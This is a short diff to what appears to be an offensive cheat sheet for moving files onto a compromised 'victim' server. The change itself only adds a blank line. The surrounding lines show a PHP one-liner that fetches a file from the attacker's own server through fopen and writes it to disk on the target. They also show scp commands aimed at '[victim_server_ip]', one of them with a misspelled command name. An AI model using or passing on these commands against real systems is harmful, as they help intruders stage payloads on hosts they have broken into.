@@ -26,6 +26,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://[my_server_ip:port/fil
 #### SCP
 ***copy file***
 scp /your/file/path.ext [name]@[victim_server_ip]:/your/file/destination/path.ext
+
 ***copy dir***
 scrp -r /your/dir/path [name]@[victim_server_ip]:/your/dir/destination/path
 
